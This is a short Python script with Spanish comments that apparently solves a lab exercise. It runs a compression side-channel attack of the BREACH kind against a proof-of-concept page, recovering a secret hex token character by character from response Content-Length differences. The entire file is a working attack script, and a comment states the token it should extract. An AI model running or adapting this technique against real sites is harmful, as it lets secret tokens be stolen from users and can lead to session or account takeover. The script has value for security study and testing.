import requests

#Token que tiene que salir bb63e4ba67e24dab81ed425c5a95b7a2
#Url de la pagina web a atacar
url="http://malbot.net/poc/?request_token=%27"
posible_characters=['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']
#Variable para controlar cuando acaba el token
not_finished=True
token=''
index=0
padding="----------"
#Respuesta de longitud referencia
while not_finished:
    long_antes=len(token)
    length_ref= int(requests.get(url+padding+padding).headers.get('Content-Length'))
    candidates=[]
    for character in posible_characters:
        length_char_antes=int(requests.get(url+token+character+padding+padding).headers.get('Content-Length'))
        length_char_despues=int(requests.get(url+token+padding+character+padding).headers.get('Content-Length'))
        if length_char_antes< length_char_despues  and length_char_antes<= length_ref:
            print("Se ha encontrado como candidato {}".format(character))
            candidates.append(character)
    if len(candidates)==1:
        token+=candidates[0]
        print("El caracter elegido es: {}".format(candidates[0]))
    else: 
        for candidate in candidates:
            token_prueba=token+candidate
            for character in posible_characters:
                length_char_antes=int(requests.get(url+token_prueba+character+padding+padding).headers.get('Content-Length'))
                length_char_despues=int(requests.get(url+token_prueba+padding+character+padding).headers.get('Content-Length'))
                if length_char_antes< length_char_despues  and length_char_antes<= length_ref:
                   token=token+candidate+character
                   print("El caracter elegido es: {}".format(candidate))
                   print("El caracter elegido es: {}".format(character))
                   break
        
    if len(token)==long_antes:
        not_finished=False
print("El token resultante es {}".format(token))
